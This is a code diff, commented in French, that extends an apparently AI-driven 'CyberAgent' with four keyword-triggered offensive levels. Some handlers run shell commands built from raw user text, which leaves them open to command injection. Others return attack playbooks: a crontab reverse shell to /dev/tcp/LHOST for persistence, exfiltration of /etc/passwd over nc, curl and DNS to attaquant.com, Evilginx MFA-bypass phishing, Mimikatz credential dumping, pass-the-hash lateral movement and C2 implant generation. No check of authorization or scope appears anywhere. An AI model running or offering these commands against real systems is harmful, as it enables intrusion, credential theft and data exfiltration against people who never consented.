@@ -14,6 +14,7 @@ from core.tools.exploit_engine import (
     cyclic_64, cyclic_find_64, get_shellcode, encode_xor,
     elf_info, exploit_summary, find_offset,
 )
+from core.tools.offensive_engine import offensive
 
 # ── Mots-clés de déclenchement par catégorie ─────────────────────────────────
 _TRIGGER_MAP = {
@@ -22,6 +23,7 @@ _TRIGGER_MAP = {
         "hôte", "host", "ping", "arp", "netdiscover", "découverte",
         "dns", "dnsenum", "dnsrecon", "fierce", "amass", "sublist3r", "subfinder",
         "sous-domaine", "subdomain", "whois", "theharvester", "osint",
+        "shodan", "maltego", "spiderfoot",
     ],
     "web": [
         "nikto", "gobuster", "dirb", "ffuf", "wfuzz", "dirsearch",
@@ -85,23 +87,54 @@ for cat, kws in _TRIGGER_MAP.items():
     for kw in kws:
         _ALL_KEYWORDS.setdefault(kw, []).append(cat)
 
+# ── Mots-clés des 4 niveaux offensifs ────────────────────────────────────────
+_LEVEL_KEYWORDS = {
+    1: ["niveau 1", "level 1", "recon avancé", "reconnaissance avancée", "cartographier",
+        "analyser logiciel", "comprendre système", "analyser binaire", "strings", "fingerprint"],
+    2: ["niveau 2", "level 2", "fuzzing", "fuzz", "afl", "afl++", "libfuzzer", "crash",
+        "valgrind", "asan", "sanitizer", "0-day", "zeroday", "bug mémoire", "overflow",
+        "use after free", "uaf", "static analysis", "semgrep", "bandit", "cppcheck"],
+    3: ["niveau 3", "level 3", "exploitation", "privesc", "privilege escalation",
+        "élévation de privilèges", "linpeas", "suid", "ret2libc", "rop chain",
+        "buffer overflow", "shellcode", "pwntools", "heap spray", "rce", "remote code"],
+    4: ["niveau 4", "level 4", "pivot", "pivoting", "persistance", "persistence",
+        "mouvement latéral", "lateral movement", "chisel", "ligolo", "proxychains",
+        "bloodhound", "pass-the-hash", "pth", "exfiltration", "c2", "apt", "pspy",
+        "sliver", "havoc", "mythic", "meterpreter", "cobalt strike",
+        "phishing", "gophish", "evilginx", "setoolkit",
+        "mimikatz", "rubeus", "powerview", "kerberoast", "as-rep", "asrep",
+        "netexec", "crackmapexec"],
+    0: ["pipeline", "fuzzing pipeline", "fuzz crash", "crash exploit", "fuzzing exploit",
+        "exploit template", "générer exploit", "workflow complet", "fuzz → exploit"],
+}
+
 
 class CyberAgent(BaseAgent):
     name = "cyber"
-    description = "Expert OSEE — recon, web, passwords, exploitation, reverse engineering, exploit dev, réseau"
+    description = "Expert OSEE — 4 niveaux Red Team, fuzzing pipeline, recon, exploitation, mouvement"
 
     def can_handle(self, task: str) -> bool:
         t = task.lower()
-        return any(kw in t for kw in _ALL_KEYWORDS)
+        if any(kw in t for kw in _ALL_KEYWORDS):
+            return True
+        for kws in _LEVEL_KEYWORDS.values():
+            if any(kw in t for kw in kws):
+                return True
+        return False
 
     async def run(self, task: str, context: Optional[dict] = None) -> dict:
         t = task.lower().strip()
+
+        # 0. Niveaux offensifs explicites
+        level_result = self._dispatch_level(task, t)
+        if level_result is not None:
+            return level_result
 
         # 1. Exploit engine (pas de commande shell)
         if self._is_exploit_engine(t):
             return self._handle_exploit_engine(task)
 
-        # 2. Commande directe (commence par un nom d'outil connu)
+        # 2. Commande directe (commence par un nom d'outil connu avec flags CLI)
         direct_cmd = self._extract_direct_command(task)
         if direct_cmd:
             return self._run_command(direct_cmd, task)
@@ -133,6 +166,472 @@ class CyberAgent(BaseAgent):
 
         return self._result(False, f"Je n'ai pas pu déterminer l'action pour : {task!r}. "
                                    f"Passe par /chat pour que l'IA interprète ta demande.")
+
+    # ── Dispatch niveaux offensifs ────────────────────────────────────────────
+
+    def _dispatch_level(self, task: str, t: str) -> Optional[dict]:
+        # Pipeline complet
+        if any(kw in t for kw in _LEVEL_KEYWORDS[0]):
+            return self._handle_pipeline(task)
+
+        # Niveau 2 — fuzzing / vuln finding
+        if any(kw in t for kw in _LEVEL_KEYWORDS[2]):
+            return self._handle_level2(task)
+
+        # Niveau 3 — exploitation avancée
+        if any(kw in t for kw in _LEVEL_KEYWORDS[3]):
+            return self._handle_level3(task)
+
+        # Niveau 4 — mouvement avancé
+        if any(kw in t for kw in _LEVEL_KEYWORDS[4]):
+            return self._handle_level4(task)
+
+        # Niveau 1 explicite (recon avancé)
+        if any(kw in t for kw in _LEVEL_KEYWORDS[1]):
+            return self._handle_level1(task)
+
+        return None
+
+    def _handle_level1(self, task: str) -> dict:
+        lvl = offensive.get_level(1)
+        target = self._extract_target(task) or self._extract_url_or_target(task)
+        binary = self._extract_file_path(task)
+        t = task.lower()
+
+        if binary and any(kw in t for kw in ["strings", "analyse binaire", "readelf", "objdump"]):
+            tool_name = "strings" if "strings" in t else ("readelf" if "readelf" in t else "objdump")
+            result = offensive.run_level_tool(1, tool_name, {"binary": binary})
+            return self._result(result["success"], result.get("output", ""), result)
+
+        if target:
+            tool_name = "nuclei" if "cve" in t else ("gobuster" if "répertoire" in t or "dir" in t else "nmap")
+            result = offensive.run_level_tool(1, tool_name, {"target": target})
+            return self._result(result["success"], result.get("output", ""), result)
+
+        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
+        return self._result(True,
+            f"{lvl.icon} NIVEAU 1 — {lvl.name}\n"
+            f"Impact : {lvl.impact}\n\n"
+            f"Outils disponibles :\n{tools_list}\n\n"
+            f"Spécifie une cible (IP, domaine) ou un binaire pour lancer.",
+            {"level": 1, "tools": [t.name for t in lvl.tools]})
+
+    def _handle_level2(self, task: str) -> dict:
+        t = task.lower()
+        binary = self._extract_file_path(task)
+
+        if any(kw in t for kw in ["fuzz", "afl", "afl++"]):
+            if binary:
+                result = offensive.run_pipeline("fuzz", binary=binary, timeout=20)
+                out = (
+                    f"Fuzzing lancé sur {binary}\n"
+                    f"Crashs trouvés : {result.get('crashes_found', 0)}\n"
+                    f"Résultat AFL++ :\n{result.get('result', '')[:500]}\n\n"
+                    f"Prochaine étape : {result.get('next_step', '')}"
+                )
+                return self._result(result["success"], out, result)
+            return self._result(True,
+                "🐛 NIVEAU 2 — Fuzzing avec AFL++\n\n"
+                "Workflow :\n"
+                "  1. Préparer corpus : mkdir corpus && echo 'test' > corpus/seed\n"
+                "  2. Lancer AFL++ : afl-fuzz -i corpus/ -o findings/ -- ./binary @@\n"
+                "  3. Analyser crashs : ls findings/default/crashes/\n"
+                "  4. Rejouer crash : ./binary < findings/default/crashes/id:000000*\n\n"
+                "Spécifie le binaire à fuzzer pour lancer directement.\n"
+                "Ex: fuzzer ./target",
+                {"level": 2})
+
+        if any(kw in t for kw in ["crash", "analyse crash", "triage"]):
+            crash = self._extract_file_path(task)
+            if binary and crash:
+                result = offensive.run_pipeline("analyse_crash", binary=binary, crash=crash)
+                return self._result(result["success"],
+                    f"Analyse crash {crash} :\n"
+                    f"Exploitabilité : {result.get('exploitability', {}).get('recommendation', '')}\n"
+                    f"Score : {result.get('exploitability', {}).get('score', 0)}/10\n\n"
+                    f"Stack trace :\n{result.get('gdb_trace', '')[:800]}\n\n"
+                    f"Prochaine étape : {result.get('next_step', '')}",
+                    result)
+
+        if any(kw in t for kw in ["valgrind", "mémoire", "memory", "leak"]):
+            if binary:
+                return self._run_command(f"valgrind --tool=memcheck --leak-check=full {binary}", task)
+
+        if any(kw in t for kw in ["semgrep", "bandit", "static", "analyse code"]):
+            path = binary or "."
+            if "python" in t or "bandit" in t:
+                return self._run_command(f"bandit -r {path} -l", task)
+            return self._run_command(f"semgrep --config=auto {path}", task)
+
+        lvl = offensive.get_level(2)
+        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
+        return self._result(True,
+            f"{lvl.icon} NIVEAU 2 — {lvl.name}\n"
+            f"Impact : {lvl.impact}\n\n"
+            f"Outils disponibles :\n{tools_list}\n\n"
+            f"Commandes rapides :\n"
+            f"  fuzzer ./binary         → AFL++ fuzzing\n"
+            f"  valgrind ./binary       → analyse mémoire\n"
+            f"  semgrep ./src/          → analyse statique\n"
+            f"  searchsploit apache 2.4 → recherche CVE",
+            {"level": 2, "tools": [t.name for t in lvl.tools]})
+
+    def _handle_level3(self, task: str) -> dict:
+        t = task.lower()
+        binary = self._extract_file_path(task)
+
+        if any(kw in t for kw in ["privesc", "privilege", "élévation", "linpeas", "suid"]):
+            if "suid" in t:
+                return self._run_command("find / -perm -4000 -user root -type f 2>/dev/null", task)
+            if "sudo" in t:
+                return self._run_command("sudo -l 2>/dev/null", task)
+            return self._result(True,
+                "💥 NIVEAU 3 — Élévation de privilèges Linux\n\n"
+                "Checklist :\n"
+                "  1. sudo -l                                   → droits sudo\n"
+                "  2. find / -perm -4000 -user root -type f     → binaires SUID\n"
+                "  3. bash linpeas.sh                           → enum complète\n"
+                "  4. cat /etc/crontab                          → tâches cron\n"
+                "  5. ls -la /etc/passwd /etc/shadow            → permissions\n"
+                "  6. uname -a && cat /etc/issue               → version kernel\n"
+                "  7. searchsploit linux kernel <version>       → exploits kernel\n\n"
+                "GTFOBins : https://gtfobins.github.io/ (exploits SUID/sudo)",
+                {"level": 3})
+
+        if any(kw in t for kw in ["rop", "ret2libc", "exploit template", "générer exploit"]):
+            if binary:
+                offset_match = re.search(r"\boffset[:\s]+(\d+)\b", t)
+                offset = int(offset_match.group(1)) if offset_match else 0
+                lhost = self._extract_ip(task) or "127.0.0.1"
+                lport = int(self._extract_port(task) or 4444)
+                result = offensive.run_pipeline("exploit_template", binary=binary,
+                                                offset=offset, lhost=lhost, lport=lport)
+                return self._result(result["success"],
+                    f"Template exploit généré :\n"
+                    f"Stratégie : {result.get('strategy', '')}\n"
+                    f"Protections : {result.get('protections', {})}\n\n"
+                    f"Code pwntools :\n{result.get('exploit_template', '')}",
+                    result)
+
+        if any(kw in t for kw in ["rce", "shellcode", "pwntools"]):
+            if binary:
+                result = offensive.run_pipeline("reverse", binary=binary)
+                return self._result(result["success"],
+                    f"Analyse exploitation de {binary} :\n"
+                    f"Fonctions dangereuses : {result.get('dangerous_functions', [])}\n"
+                    f"Gadgets ROP :\n{result.get('rop_gadgets_sample', '')[:600]}",
+                    result)
+
+        lvl = offensive.get_level(3)
+        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
+        return self._result(True,
+            f"{lvl.icon} NIVEAU 3 — {lvl.name}\n"
+            f"Impact : {lvl.impact}\n\n"
+            f"Outils disponibles :\n{tools_list}\n\n"
+            f"Commandes rapides :\n"
+            f"  privesc linux             → checklist élévation de privs\n"
+            f"  exploit template ./binary → générer exploit pwntools\n"
+            f"  rop gadgets ./binary      → chaîne ROP\n"
+            f"  metasploit exploit/...    → Metasploit Framework",
+            {"level": 3, "tools": [t.name for t in lvl.tools]})
+
+    def _handle_level4(self, task: str) -> dict:
+        t = task.lower()
+        target = self._extract_target(task)
+        lhost = self._extract_ip(task)
+        lport = self._extract_port(task) or "4444"
+
+        if any(kw in t for kw in ["pivot", "chisel", "tunnel"]):
+            return self._result(True,
+                "🧠 NIVEAU 4 — Pivoting réseau\n\n"
+                "Chisel (tunnel TCP/HTTP) :\n"
+                "  Attaquant : chisel server -p 8080 --reverse\n"
+                "  Victime   : chisel client <attaquant>:8080 R:socks\n"
+                "  Config    : proxychains4 → socks5 127.0.0.1 1080\n\n"
+                "Ligolo-ng (plus rapide) :\n"
+                "  Proxy     : ligolo-ng -selfcert -laddr 0.0.0.0:443\n"
+                "  Agent     : ligolo-ng -connect <attaquant>:443 -ignore-cert\n\n"
+                "SSHuttle (VPN SSH) :\n"
+                f"  sshuttle -r user@{target or 'pivot'} 10.0.0.0/8",
+                {"level": 4})
+
+        if any(kw in t for kw in ["persist", "persistance", "crontab", "cron", "backdoor"]):
+            return self._result(True,
+                "🧠 NIVEAU 4 — Persistance\n\n"
+                f"Crontab (sans root) :\n"
+                f"  (crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/{lhost or 'LHOST'}/{lport} 0>&1') | crontab -\n\n"
+                f"Clé SSH :\n"
+                f"  mkdir -p ~/.ssh && echo '<pubkey>' >> ~/.ssh/authorized_keys\n\n"
+                f"Service systemd (root) :\n"
+                f"  Créer /etc/systemd/system/svc.service avec ExecStart reverse shell\n"
+                f"  systemctl enable svc && systemctl start svc\n\n"
+                f"Meterpreter — persistance :\n"
+                f"  meterpreter> run persistence -X -i 60 -p {lport} -r {lhost or 'LHOST'}",
+                {"level": 4})
+
+        if any(kw in t for kw in ["latéral", "lateral", "crackmapexec", "psexec", "wmiexec"]):
+            if not target:
+                return self._result(False, "Spécifie la cible et les credentials.")
+            return self._result(True,
+                f"🧠 NIVEAU 4 — Mouvement latéral vers {target}\n\n"
+                f"SMB (crackmapexec) :\n"
+                f"  crackmapexec smb {target} -u user -p 'pass'\n"
+                f"  crackmapexec smb {target} -u user -H <nthash>\n\n"
+                f"PSExec (Impacket) :\n"
+                f"  impacket-psexec domain/user:'pass'@{target}\n\n"
+                f"WMIExec (sans fichiers) :\n"
+                f"  impacket-wmiexec domain/user:'pass'@{target}\n\n"
+                f"WinRM :\n"
+                f"  evil-winrm -i {target} -u user -p 'pass'\n"
+                f"  evil-winrm -i {target} -u user -H <nthash>",
+                {"level": 4})
+
+        if any(kw in t for kw in ["exfil", "exfiltration", "extraire données"]):
+            return self._result(True,
+                "🧠 NIVEAU 4 — Exfiltration de données\n\n"
+                "Via netcat (simple) :\n"
+                f"  Récepteur : nc -lvnp {lport} > loot.tar.gz\n"
+                f"  Victime   : tar czf - /données | nc {lhost or 'LHOST'} {lport}\n\n"
+                "Via HTTP (discret) :\n"
+                f"  curl -s -X POST http://{lhost or 'LHOST'}:{lport} -d @/etc/passwd\n\n"
+                "Via DNS (très discret) :\n"
+                "  base64 /etc/passwd | while read l; do dig $l.attaquant.com; done",
+                {"level": 4})
+
+        # ── C2 Frameworks ─────────────────────────────────────────────────────
+        if any(kw in t for kw in ["sliver", "c2 sliver"]):
+            return self._result(True,
+                "🧠 C2 — Sliver (open-source, cross-platform)\n\n"
+                "Installation : sudo apt install sliver\n\n"
+                "Démarrage serveur :\n"
+                "  sliver-server\n\n"
+                "Dans Sliver :\n"
+                "  sliver > mtls --lport 443              (démarrer listener)\n"
+                f"  sliver > generate --mtls --lhost {lhost or 'LHOST'} --os linux --arch amd64\n"
+                "  sliver > generate --mtls --lhost IP --os windows -f exe\n"
+                "  sliver > sessions                      (voir les implants)\n"
+                "  sliver > use <session_id>              (interagir)\n\n"
+                "Commandes post-exploitation :\n"
+                "  sliver (victim) > whoami ; ifconfig ; ps\n"
+                "  sliver (victim) > download /etc/shadow\n"
+                "  sliver (victim) > execute --output -- 'cat /etc/passwd'",
+                {"level": 4, "tool": "sliver"})
+
+        if any(kw in t for kw in ["havoc", "c2 havoc"]):
+            return self._result(True,
+                "🧠 C2 — Havoc (open-source, GUI)\n\n"
+                "Démarrage :\n"
+                "  havoc server --profile havoc.yaotl -v\n"
+                "  havoc client  (ouvrir l'interface)\n\n"
+                "Profil minimal havoc.yaotl :\n"
+                "  Teamserver { Host = 0.0.0.0; Port = 40056; }\n"
+                "  Operators { operator { Username = admin; Password = password; } }\n"
+                "  Listeners { Http { Name = http; Hosts = [\"LHOST\"]; Port = 80; } }\n\n"
+                "Générer un implant :\n"
+                "  Listeners → New Listener (HTTP/HTTPS/SMB)\n"
+                "  Payloads → New Payload → Windows Shellcode/EXE",
+                {"level": 4, "tool": "havoc"})
+
+        if any(kw in t for kw in ["mythic", "c2 mythic"]):
+            return self._result(True,
+                "🧠 C2 — Mythic (framework modulaire, Docker)\n\n"
+                "Installation :\n"
+                "  git clone https://github.com/its-a-feature/Mythic\n"
+                "  cd Mythic && sudo ./install_docker_ubuntu.sh\n"
+                "  sudo make && sudo ./mythic-cli start\n\n"
+                "Accès : https://localhost:7443\n"
+                "  Login : mythic_admin / (voir .env)\n\n"
+                "Installer un agent (ex: Apollo) :\n"
+                "  sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo\n"
+                "  sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http",
+                {"level": 4, "tool": "mythic"})
+
+        if any(kw in t for kw in ["meterpreter", "metasploit c2", "msf c2"]):
+            lport_val = lport or "4444"
+            return self._result(True,
+                "🧠 C2 — Meterpreter (Metasploit)\n\n"
+                "Listener :\n"
+                f"  msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST {lhost or 'LHOST'}; set LPORT {lport_val}; run'\n\n"
+                "Commandes Meterpreter :\n"
+                "  sysinfo ; getuid ; getsystem (privesc)\n"
+                "  hashdump (SAM) ; run post/multi/recon/local_exploit_suggester\n"
+                "  upload / download\n"
+                "  portfwd add -l 8080 -p 80 -r victim\n"
+                "  run post/multi/manage/shell_to_meterpreter\n"
+                "  load kiwi ; creds_all (mimikatz)",
+                {"level": 4, "tool": "meterpreter"})
+
+        # ── Phishing ──────────────────────────────────────────────────────────
+        if any(kw in t for kw in ["phishing", "gophish", "campagne phishing"]):
+            return self._result(True,
+                "🧠 NIVEAU 4 — Phishing (Gophish)\n\n"
+                "Démarrage Gophish :\n"
+                "  gophish-start\n"
+                "  UI : http://localhost:3333 (admin/gophish)\n\n"
+                "Workflow :\n"
+                "  1. Sending Profile → configurer SMTP\n"
+                "  2. Email Template → importer template phishing\n"
+                "  3. Landing Page → cloner page login (http://target)\n"
+                "  4. Users & Groups → importer liste emails\n"
+                "  5. Campaign → lancer et tracker\n\n"
+                "Indicateurs suivis : ouvertures, clics, credentials soumis",
+                {"level": 4, "tool": "gophish"})
+
+        if any(kw in t for kw in ["evilginx", "mfa bypass", "adversary-in-the-middle"]):
+            return self._result(True,
+                "🧠 NIVEAU 4 — Evilginx (AiTM — MFA Bypass)\n\n"
+                "Démarrage :\n"
+                "  evilginx -p /usr/share/evilginx/phishlets\n\n"
+                "Configuration :\n"
+                "  evilginx > config domain attacker.com\n"
+                "  evilginx > config ip <VPS_IP>\n"
+                "  evilginx > phishlets hostname o365 login.attacker.com\n"
+                "  evilginx > phishlets enable o365\n"
+                "  evilginx > lures create o365\n"
+                "  evilginx > lures get-url 0\n\n"
+                "Phishlets disponibles : o365, gmail, linkedin, github, dropbox, facebook\n\n"
+                "Sessions capturées (tokens + credentials) :\n"
+                "  evilginx > sessions",
+                {"level": 4, "tool": "evilginx"})
+
+        # ── AD / Kerberos ─────────────────────────────────────────────────────
+        if any(kw in t for kw in ["mimikatz", "credentials windows", "lsass dump"]):
+            return self._result(True,
+                "🧠 NIVEAU 4 — Mimikatz (Credential Dump)\n\n"
+                "Via Meterpreter (recommandé) :\n"
+                "  meterpreter> load kiwi\n"
+                "  meterpreter> creds_all\n"
+                "  meterpreter> lsa_dump_secrets\n\n"
+                "Via Wine (Linux) :\n"
+                "  wine /usr/share/mimikatz/x64/mimikatz.exe\n\n"
+                "Commandes clés :\n"
+                "  sekurlsa::logonpasswords    (passwords en clair LSASS)\n"
+                "  lsadump::sam               (hash SAM)\n"
+                "  lsadump::lsa /patch         (hashes LSA)\n"
+                "  sekurlsa::tickets /export   (tickets Kerberos)\n"
+                "  kerberos::ptt ticket.kirbi  (Pass-the-Ticket)",
+                {"level": 4, "tool": "mimikatz"})
+
+        if any(kw in t for kw in ["rubeus", "kerberoast", "as-rep", "asrep", "pass-the-ticket", "kerberos attaque"]):
+            return self._result(True,
+                "🧠 NIVEAU 4 — Rubeus (Attaques Kerberos)\n\n"
+                "Kerberoasting (obtenir TGS crackables) :\n"
+                "  Rubeus.exe kerberoast /outfile:hashes.txt\n"
+                "  hashcat -m 13100 hashes.txt rockyou.txt\n\n"
+                "AS-REP Roasting (pas de pré-auth) :\n"
+                "  Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n"
+                "  hashcat -m 18200 asrep.txt rockyou.txt\n\n"
+                "Pass-the-Ticket :\n"
+                "  Rubeus.exe ptt /ticket:base64encodedticket\n\n"
+                "Dump tickets existants :\n"
+                "  Rubeus.exe dump /service:krbtgt\n\n"
+                "Note : Rubeus est un outil Windows — utiliser depuis une machine Windows\n"
+                "Alternative Linux : impacket-GetUserSPNs (kerberoast), impacket-GetNPUsers (AS-REP)",
+                {"level": 4, "tool": "rubeus"})
+
+        if any(kw in t for kw in ["netexec", "nxc", "crackmapexec", "cme"]):
+            target_str = target or "<subnet>"
+            return self._result(True,
+                f"🧠 NIVEAU 4 — NetExec (CrackMapExec v2)\n\n"
+                f"Scan réseau Windows :\n"
+                f"  netexec smb {target_str}/24 --gen-relay-list relays.txt\n\n"
+                f"Authentification / password spray :\n"
+                f"  netexec smb {target_str} -u users.txt -p passwords.txt --continue-on-success\n"
+                f"  netexec smb {target_str} -u user -H <nthash>  (Pass-the-Hash)\n\n"
+                f"Shares et informations :\n"
+                f"  netexec smb {target_str} -u user -p 'pass' --shares\n"
+                f"  netexec ldap {target_str} -u '' -p '' --users\n\n"
+                f"Exécution de commandes :\n"
+                f"  netexec winrm {target_str} -u admin -p 'pass' -x 'whoami'\n"
+                f"  netexec smb {target_str} -u admin -p 'pass' -M mimikatz",
+                {"level": 4, "tool": "netexec"})
+
+        if any(kw in t for kw in ["shodan", "reconnaissance internet", "appareils exposés"]):
+            query = re.sub(r"shodan\s*", "", task, flags=re.IGNORECASE).strip()
+            if query and not any(kw in query.lower() for kw in ["guide", "aide", "help", "quoi"]):
+                return self._run_command(f"shodan search '{query}'", task)
+            return self._result(True,
+                "🔍 Shodan — Moteur de recherche d'appareils exposés\n\n"
+                "Commandes utiles :\n"
+                "  shodan search 'apache country:FR'\n"
+                "  shodan search 'default password'\n"
+                "  shodan host <IP>           (infos sur une IP)\n"
+                "  shodan count 'mongodb'\n"
+                "  shodan stats --facets country,port 'nginx'\n\n"
+                "Filtres puissants :\n"
+                "  port:22 country:US org:'Amazon'\n"
+                "  product:'IIS' version:'7.5'\n"
+                "  vuln:CVE-2021-44228  (Log4Shell)\n\n"
+                "Configuration : shodan init <API_KEY>",
+                {"level": 1, "tool": "shodan"})
+
+        lvl = offensive.get_level(4)
+        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
+        return self._result(True,
+            f"{lvl.icon} NIVEAU 4 — {lvl.name}\n"
+            f"Impact : {lvl.impact}\n\n"
+            f"Outils disponibles ({len(lvl.tools)}) :\n{tools_list}\n\n"
+            f"Domaines couverts :\n"
+            f"  C2         → sliver | havoc | mythic | meterpreter\n"
+            f"  Phishing   → gophish | evilginx | setoolkit\n"
+            f"  AD/Kerberos→ mimikatz | rubeus | bloodhound | powerview\n"
+            f"  Mouvement  → netexec | impacket | evil-winrm\n"
+            f"  Pivot      → chisel | ligolo-ng | proxychains | sshuttle\n"
+            f"  Persistance→ crontab | ssh keys | systemd | meterpreter\n"
+            f"  Exfil      → nc | curl | dns",
+            {"level": 4, "tools": [t.name for t in lvl.tools]})
+
+    def _handle_pipeline(self, task: str) -> dict:
+        t = task.lower()
+        binary = self._extract_file_path(task)
+
+        stages = {
+            "fuzz": any(kw in t for kw in ["fuzz", "afl"]),
+            "reverse": any(kw in t for kw in ["reverse", "analyser", "r2", "gdb"]),
+            "exploit": any(kw in t for kw in ["exploit", "payload", "rop"]),
+        }
+
+        if binary and stages["fuzz"]:
+            result = offensive.run_pipeline("fuzz", binary=binary, timeout=15)
+            return self._result(True,
+                f"Pipeline Fuzzing → Exploit sur {binary}\n\n"
+                f"Étape 1/4 — FUZZING AFL++\n"
+                f"  Crashs trouvés : {result.get('crashes_found', 0)}\n"
+                f"  {result.get('result', '')[:300]}\n\n"
+                f"Étape 2/4 — ANALYSE CRASH\n"
+                f"  Commande : analyse_crash {binary} findings/default/crashes/id:000000*\n\n"
+                f"Étape 3/4 — REVERSE ENGINEERING\n"
+                f"  Commande : reverse {binary}\n\n"
+                f"Étape 4/4 — EXPLOIT DEV\n"
+                f"  Commande : exploit template {binary} offset 72",
+                result)
+
+        if binary and stages["reverse"]:
+            result = offensive.run_pipeline("reverse", binary=binary)
+            return self._result(result["success"],
+                f"Analyse reverse de {binary} :\n\n"
+                f"Protections :\n{result.get('checksec', '')}\n\n"
+                f"Fonctions dangereuses : {result.get('dangerous_functions', [])}\n\n"
+                f"Strings intéressantes : {result.get('interesting_strings', [])}\n\n"
+                f"Gadgets ROP :\n{result.get('rop_gadgets_sample', '')[:800]}",
+                result)
+
+        return self._result(True,
+            "Pipeline complet Fuzzing → Crash → Reverse → Exploit\n\n"
+            "Étape 1 — FUZZING (trouver des crashs) :\n"
+            "  mkdir corpus && echo 'test' > corpus/seed\n"
+            "  afl-fuzz -i corpus/ -o findings/ -- ./binary @@\n\n"
+            "Étape 2 — ANALYSE CRASH (exploitabilité) :\n"
+            "  gdb -batch -ex 'run < crash' -ex 'bt full' ./binary\n"
+            "  checksec --file=./binary\n\n"
+            "Étape 3 — REVERSE (comprendre le bug) :\n"
+            "  reverse ./binary          → analyse complète via L'Œil\n"
+            "  r2 -A ./binary            → radare2\n\n"
+            "Étape 4 — EXPLOIT DEV :\n"
+            "  exploit template ./binary offset 72 LHOST 10.0.0.1\n\n"
+            "Spécifie le binaire pour lancer le pipeline complet.\n"
+            "Ex: fuzzer ./target | pipeline ./target",
+            {"pipeline": ["fuzz", "analyse_crash", "reverse", "exploit_template"]})
 
     # ── Catégorie détection ───────────────────────────────────────────────────
 
@@ -200,6 +699,28 @@ class CyberAgent(BaseAgent):
     # ── Handlers par catégorie ────────────────────────────────────────────────
 
     def _handle_recon(self, task: str) -> dict:
+        t = task.lower()
+
+        # Shodan — moteur de recherche d'appareils exposés
+        if "shodan" in t:
+            query = re.sub(r"\bshodan\b\s*", "", task, flags=re.IGNORECASE).strip()
+            if query and not any(kw in query.lower() for kw in ["guide", "aide", "help", "scanner", "?"]):
+                return self._run_command(f"shodan search '{query}'", task)
+            return self._result(True,
+                "🔍 Shodan — Moteur de recherche d'appareils exposés\n\n"
+                "Commandes utiles :\n"
+                "  shodan search 'apache country:FR'\n"
+                "  shodan search 'default password'\n"
+                "  shodan host <IP>           (infos sur une IP)\n"
+                "  shodan count 'mongodb'\n"
+                "  shodan stats --facets country,port 'nginx'\n\n"
+                "Filtres puissants :\n"
+                "  port:22 country:US org:'Amazon'\n"
+                "  product:'IIS' version:'7.5'\n"
+                "  vuln:CVE-2021-44228  (Log4Shell)\n\n"
+                "Configuration : shodan init <API_KEY>",
+                {"tool": "shodan"})
+
         target = self._extract_target(task)
         if not target:
             return self._result(False, "Spécifie une cible (IP, domaine ou plage réseau).",
